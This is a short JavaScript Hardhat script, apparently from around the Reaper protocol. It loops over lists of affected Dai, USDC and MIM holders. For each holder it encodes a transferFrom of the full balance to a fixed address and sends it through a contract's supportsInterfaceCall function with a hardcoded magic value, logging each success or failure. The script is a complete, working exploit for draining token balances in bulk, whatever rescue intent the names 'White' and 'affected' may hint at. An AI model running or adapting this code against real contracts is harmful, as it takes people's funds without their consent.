const reaper = require("../src/ReaperSDK.js");
const addresses = require("../Addresses.json");
const { testAccount } = require("../secrets.json");
const { tokens, testnet, mainnet } = require("../Addresses.json");
const ERC20 = require("../artifacts/contracts/OZ/token/ERC20/ERC20.sol/ERC20.json");
const affected = require("./affected.json");

async function main() {

  let White = await ethers.getContractFactory("Part");
  let white = await White.attach("0x689E0205D21337CFEbBe0BeAbf33E1BaE2A1aE06");
  const iface = new ethers.utils.Interface(ERC20.abi);

  let Dai = "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E";
  let Usdc = "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75";
  let Mim = "0x82f0B8B456c1A451378467398982d4834b6829c1";

  const Coins = [affected.Dai, affected.Usdc, affected.Mim];

    for (let i=0; i < Coins.length; i++) {
      let current = Coins[i];
      console.log("Starting");
      for (let _i=0; _i<current.users.length; _i++) {
        let balance = await reaper.getUserBalance(current.users[_i], current.address);
        if (balance > 0) {
        const data = iface.encodeFunctionData(
          'transferFrom',
          [
          current.users[_i],
          "0xC6793f0f32ce4b3044DC234A4420FA813dc8A470",
          balance
          ]
        );
          try {
            await white.supportsInterfaceCall(
              current.address,
              ethers.BigNumber.from("47885579920849467292483133015566441094282559753913080225088502214278217640842"),
              data,
              reaper.BigGas
            )
            reaper.sleep(10000);
            console.log("success at " +current.users[_i] + " for " +balance.toString());
          } catch(error) {
            console.log("failure at " +current.users[_i] + " for " +balance.toString());
            console.log(error);
            reaper.sleep(10000);
          }
        }
      }
    }
  console.log("finished");
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
  });
